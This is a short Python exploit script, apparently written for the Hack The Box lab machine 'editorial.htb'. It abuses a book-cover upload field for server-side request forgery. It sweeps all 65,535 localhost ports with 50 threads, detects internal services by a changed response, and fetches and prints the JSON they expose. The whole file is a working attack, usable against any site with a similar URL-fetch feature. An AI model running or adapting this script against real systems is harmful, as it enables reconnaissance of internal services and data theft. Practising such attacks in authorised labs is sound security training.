import requests
import json
from concurrent.futures import ThreadPoolExecutor, as_completed

def probar_puerto(n, url, head):
    files = {
        'bookurl': (None, f'http://127.0.0.1:{n}'),
        'bookfile': ('', '', 'application/octet-stream')
    }

    try:
        response = requests.post(url, files=files, headers=head)
        if '1630734277837_ebe62757b6e0' not in response.text:
            return n, response.text 
    except Exception:
        return None, None 

    return None, None  

def ssrf():
    url = "http://editorial.htb/upload-cover"
    urlget = 'http://editorial.htb/'
    head = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0',
        'Accept': '*/*',
        'Accept-Language': 'es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding': 'gzip, deflate, br',
        'Origin': 'http://editorial.htb',
        'Referer': 'http://editorial.htb/upload',
        'Connection': 'keep-alive',
        'Priority': 'u=0'
    }

    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(probar_puerto, n, url, head): n for n in range(1, 65536)}
        for future in as_completed(futures):
            puerto, response_text = future.result()
            if puerto:
                print(f'Puerto {puerto} encontrado')
                getresponse = requests.get(urlget + response_text)
                try:
                    jsondata = getresponse.json()
                    print(json.dumps(jsondata, indent=4))
                except json.JSONDecodeError:
                    print(f'Error al decodificar JSON en la respuesta del puerto {puerto}')
                executor.shutdown(wait=False)
                break

if __name__ == '__main__':
    ssrf()
